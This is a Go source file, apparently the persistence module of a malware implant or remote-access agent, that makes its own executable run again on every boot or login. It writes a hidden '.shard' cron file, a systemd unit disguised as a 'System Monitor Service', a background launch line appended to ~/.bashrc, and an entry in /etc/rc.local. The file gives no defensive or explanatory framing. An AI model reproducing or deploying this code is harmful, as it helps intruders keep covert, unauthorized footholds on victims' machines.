package agent

import (
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
)

func executablePath() (string, error) {
	p, err := os.Executable()
	if err != nil {
		return "", err
	}
	return filepath.EvalSymlinks(p)
}

func PersistCron() error {
	if runtime.GOOS != "linux" {
		return fmt.Errorf("cron persistence only supported on linux")
	}

	execPath, err := executablePath()
	if err != nil {
		return fmt.Errorf("get executable path: %w", err)
	}

	var cronDir string
	if os.Getuid() == 0 {
		cronDir = "/etc/cron.d"
	} else {
		u, err := user.Current()
		if err != nil {
			return fmt.Errorf("get current user: %w", err)
		}
		cronDir = filepath.Join(u.HomeDir, ".local", "cron.d")
		os.MkdirAll(cronDir, 0700)
	}

	cronPath := filepath.Join(cronDir, ".shard")
	var entry string
	if os.Getuid() == 0 {
		entry = fmt.Sprintf("@reboot root %s --daemon\n", execPath)
	} else {
		entry = fmt.Sprintf("@reboot %s --daemon\n", execPath)
	}

	return os.WriteFile(cronPath, []byte(entry), 0600)
}

func PersistSystemd() error {
	if runtime.GOOS != "linux" {
		return fmt.Errorf("systemd persistence only supported on linux")
	}

	execPath, err := executablePath()
	if err != nil {
		return fmt.Errorf("get executable path: %w", err)
	}

	var unitDir string
	if os.Getuid() == 0 {
		unitDir = "/etc/systemd/system"
	} else {
		u, err := user.Current()
		if err != nil {
			return fmt.Errorf("get current user: %w", err)
		}
		unitDir = filepath.Join(u.HomeDir, ".config", "systemd", "user")
		os.MkdirAll(unitDir, 0700)
	}

	unit := fmt.Sprintf(`[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=%s --daemon
Restart=on-failure
RestartSec=30

[Install]
WantedBy=multi-user.target
`, execPath)

	unitPath := filepath.Join(unitDir, "sysmon.service")
	return os.WriteFile(unitPath, []byte(unit), 0600)
}

func PersistBashRC() error {
	if runtime.GOOS != "linux" && runtime.GOOS != "darwin" {
		return fmt.Errorf("bashrc persistence not supported on %s", runtime.GOOS)
	}

	execPath, err := executablePath()
	if err != nil {
		return fmt.Errorf("get executable path: %w", err)
	}

	u, err := user.Current()
	if err != nil {
		return fmt.Errorf("get current user: %w", err)
	}

	rcPath := filepath.Join(u.HomeDir, ".bashrc")
	line := fmt.Sprintf("\n(nohup %s --daemon >/dev/null 2>&1 &)\n", execPath)

	existing, _ := os.ReadFile(rcPath)
	if len(existing) > 0 {
		if contains(string(existing), execPath) {
			return nil
		}
	}

	f, err := os.OpenFile(rcPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return fmt.Errorf("open bashrc: %w", err)
	}
	defer f.Close()

	_, err = f.WriteString(line)
	return err
}

func PersistRCLocal() error {
	if runtime.GOOS != "linux" {
		return fmt.Errorf("rc.local persistence only supported on linux")
	}
	if os.Getuid() != 0 {
		return fmt.Errorf("rc.local persistence requires root")
	}

	execPath, err := executablePath()
	if err != nil {
		return fmt.Errorf("get executable path: %w", err)
	}

	rcPath := "/etc/rc.local"
	line := fmt.Sprintf("nohup %s --daemon >/dev/null 2>&1 &\n", execPath)

	existing, _ := os.ReadFile(rcPath)
	if len(existing) > 0 && contains(string(existing), execPath) {
		return nil
	}

	var content string
	if len(existing) == 0 {
		content = "#!/bin/sh\n" + line + "exit 0\n"
	} else {
		s := string(existing)
		exitIdx := len(s)
		for i := len(s) - 1; i >= 0; i-- {
			if s[i] == 'e' && i+6 <= len(s) && s[i:i+6] == "exit 0" {
				exitIdx = i
				break
			}
		}
		content = s[:exitIdx] + line + s[exitIdx:]
	}

	if err := os.WriteFile(rcPath, []byte(content), 0755); err != nil {
		return fmt.Errorf("write rc.local: %w", err)
	}
	return nil
}

func contains(s, substr string) bool {
	return len(s) >= len(substr) && searchString(s, substr)
}

func searchString(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
